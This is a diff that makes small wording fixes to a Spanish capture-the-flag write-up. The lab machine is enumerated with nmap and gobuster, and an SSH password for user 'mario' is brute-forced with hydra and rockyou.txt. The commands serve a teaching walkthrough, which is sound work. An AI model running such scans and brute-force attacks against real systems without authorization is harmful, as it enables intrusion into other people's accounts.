@@ -17,7 +17,7 @@ rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms
 
 Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.
 
-Lanzamos # nmap para ver que puertos nos encuentra.
+Lanzamos nmap para ver que puertos nos encuentra.
 
 ```bash
 nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
@@ -67,7 +67,7 @@ PORT   STATE SERVICE REASON         VERSION
 MAC Address: 02:42:AC:11:00:02 (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-No vemos nada que nos llame la atención así que empezaremos la enumeración del puerto 80, y como vemos que el título ya nos muestra que es la página principal de Apaches por lo que lanzamos #gobuster para ir haciendo fuzzing.
+No vemos nada que nos llame la atención así que empezaremos la enumeración del puerto 80, y como vemos que el título ya nos muestra que es la página principal de Apache por lo que lanzamos gobuster para ir haciendo fuzzing.
 
 ```bash
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php, txt, html
@@ -106,7 +106,7 @@ Starting gobuster in directory enumeration mode
 
 Encontramos una página que nos llama la atención, que es **/secret.php**.
 
-En la página http://172.17.0.2/secret.php encontramos un mensaje de lo que podemos pensar que **Mario** podría ser un usuario. Como tenemos el puerto 22 abierto, podríamos probar la intrusión por fuerza bruta con #hydra.
+En la página http://172.17.0.2/secret.php encontramos un mensaje de lo que podemos pensar que **Mario** podría ser un usuario. Como tenemos el puerto 22 abierto, podríamos probar la intrusión por fuerza bruta con hydra.
 
 ## Explotación
 
@@ -117,7 +117,7 @@ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 - `-P /usr/share/wordlists/rockyou.txt`: Especifica la ubicación del archivo de contraseñas a utilizar. En este caso, se utiliza el archivo "rockyou.txt" como lista de contraseñas.
 - `ssh://172.17.0.2`: Indica el protocolo a utilizar (`ssh`) y la dirección IP del host objetivo (`172.17.0.2`). Esto establece el destino del intento de inicio de sesión mediante SSH.
 
-Con #hydra encontramos la contraseña para el usuario *mario* por el puerto 22.
+Con hydra encontramos la contraseña para el usuario *mario* por el puerto 22.
 ```bash
 ❯ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
